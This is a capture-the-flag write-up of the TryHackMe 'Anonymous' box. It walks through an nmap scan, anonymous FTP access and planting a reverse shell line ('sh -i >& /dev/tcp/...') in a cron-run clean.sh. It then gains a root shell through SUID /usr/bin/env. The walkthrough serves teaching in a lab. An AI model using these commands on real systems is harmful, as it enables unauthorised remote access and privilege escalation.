---
title: TryHackMe - Anonymous
date: 2025-10-23 18:30:58 +01:00
categories: [Cybersecurity,CTFs]
tags: [Cybersecurity,CTFs] # TAG names should always be lowercase
---

This is a medium Linux box on TryHackMe.
> - Try to get the two flags! Root the machine and prove your understanding of the fundamentals! This is a virtual machine meant for beginners.
> - Acquiring both flags will require some basic knowledge of Linux and privilege escalation methods.

## Reconnaissance

```bash
$ nmap -sC -sV  -A  -Pn -p- -oN nmap_result 10.10.130.199
Starting Nmap 7.93 ( https://nmap.org ) at 2025-10-23 15:33 CEST
Nmap scan report for 10.10.130.199
Host is up (0.036s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.18.11.118
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8bca21621c2b23fa6bc61fa813fe1c68 (RSA)
|   256 9589a412e2e6ab905d4519ff415f74ce (ECDSA)
|_  256 e12a96a4ea8f688fcc74b8f0287270cd (ED25519)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1s, deviation: 1s, median: 1s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-10-23T13:34:19
|_  start_date: N/A
|_nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: anonymous
|   NetBIOS computer name: ANONYMOUS\x00
|   Domain name: \x00
|   FQDN: anonymous
|_  System time: 2025-10-23T13:34:19+00:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 65.26 seconds
```
We notice a few ports are open, but most importantly is that FPT allows anonymous logins.
```bash
ftp 10.10.130.199
Connected to 10.10.130.199.
220 NamelessOne's FTP Server!
Name (10.10.130.199:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts
ftp> cd scripts
250 Directory successfully changed.
ftp> dir
-rwxr-xrwx    1 1000     1000          314 Jun 04  2020 clean.sh
-rw-rw-r--    1 1000     1000         1161 Apr 07 13:39 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
ftp> get to_do.txt
local: to_do.txt remote: to_do.txt
ftp> get removed_files.log
local: removed_files.log remote: removed_files.log
ftp> get clean.sh
local: clean.sh remote: clean.sh
ftp> exit
221 Goodbye.

$ cat to_do.txt  
I really need to disable the anonymous login...its really not safe
$ cat removed_files.log 
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete     
$ cat clean.sh         
#!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi
```
Nothing special here, we can however, mount this share and overwrite the clean.sh file as it seems to be triggered by a cronjob.

### Check out SMB share

```bash
$ smbclient -L 10.10.130.199               
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        pics            Disk      My SMB Share Directory for Pics
        IPC$            IPC       IPC Service (anonymous server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            ANONYMOUS

```

Nothing special found here.

## Foothold

We will mount the drive with curlftpfs and try to overwrite clean.sh to spawn a reverse shell.

### Mount the drive

```bash
$ sudo apt install curlftpfs
$ sudo curlftpfs anonymous:anonymous@10.10.130.199 /mnt/my_ftp/ 
$ sudo ls /mnt/my_ftp
scripts
```

The drive is mounted now we can edit the clean.sh script and add the command sh -i >& /dev/tcp/10.18.11.118/1234 0>&1 to spawn a reverse shell. We will also spawn a netcat listener (nc -lvnp 1234) in a separate window.

```bash
$ sudo vi /mnt/my_ftp/scripts/clean.sh
#!/bin/bash

sh -i >& /dev/tcp/10.18.11.118/1234 0>&1

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi
```
## Privilege Escalation

We got access to the shell, through enumeration we check all binaries that had the SUID bit set through find / -type f -perm -u=s -ls 2>/dev/null and noticed that /usr/bin/env is in this list. According to GTFObins:

> - If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor.

We can get a root shell through running the command /usr/bin/env /bin/sh -p

```bash
$ nc -lvnp 1234                                 
listening on [any] 1234 ...
connect to [10.18.11.118] from (UNKNOWN) [10.10.130.199] 57340
$ whoami
namelessone
$ ls
pics
user.txt
$ cat user.txt
**REDACTED**
$ sudo -l
sudo: no tty present and no askpass program specified
$ find / -type f -perm -u=s -ls 2>/dev/null
   131150     28 -rwsr-xr-x   1 root     root               26696 Mar  5  2020 /bin/umount
   131140     32 -rwsr-xr-x   1 root     root               30800 Aug 11  2016 /bin/fusermount
   131191     64 -rwsr-xr-x   1 root     root               64424 Jun 28  2019 /bin/ping
   131084     44 -rwsr-xr-x   1 root     root               43088 Mar  5  2020 /bin/mount
   131207     44 -rwsr-xr-x   1 root     root               44664 Mar 22  2019 /bin/su
   919497     12 -rwsr-xr-x   1 root     root               10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
   919679    428 -rwsr-xr-x   1 root     root              436552 Mar  4  2019 /usr/lib/openssh/ssh-keysign
   919144     60 -rwsr-xr-x   1 root     root               59640 Mar 22  2019 /usr/bin/passwd
   918992     36 -rwsr-xr-x   1 root     root               35000 Jan 18  2018 /usr/bin/env
   919017     76 -rwsr-xr-x   1 root     root               75824 Mar 22  2019 /usr/bin/gpasswd
   919128     40 -rwsr-xr-x   1 root     root               37136 Mar 22  2019 /usr/bin/newuidmap
   919127     40 -rwsr-xr-x   1 root     root               40344 Mar 22  2019 /usr/bin/newgrp
   918924     44 -rwsr-xr-x   1 root     root               44528 Mar 22  2019 /usr/bin/chsh
   919126     40 -rwsr-xr-x   1 root     root               37136 Mar 22  2019 /usr/bin/newgidmap
   918922     76 -rwsr-xr-x   1 root     root               76496 Mar 22  2019 /usr/bin/chfn
   919269    148 -rwsr-xr-x   1 root     root              149080 Jan 31  2020 /usr/bin/sudo
   919305     20 -rwsr-xr-x   1 root     root               18448 Jun 28  2019 /usr/bin/traceroute6.iputils
   918871     52 -rwsr-sr-x   1 daemon   daemon             51464 Feb 20  2018 /usr/bin/at
   919164     24 -rwsr-xr-x   1 root     root               22520 Mar 27  2019 /usr/bin/pkexec
$ /usr/bin/env /bin/sh -p
ls
pics
user.txt
$ whoami
root
$ cat /root/root.txt
**REDACTED**
```
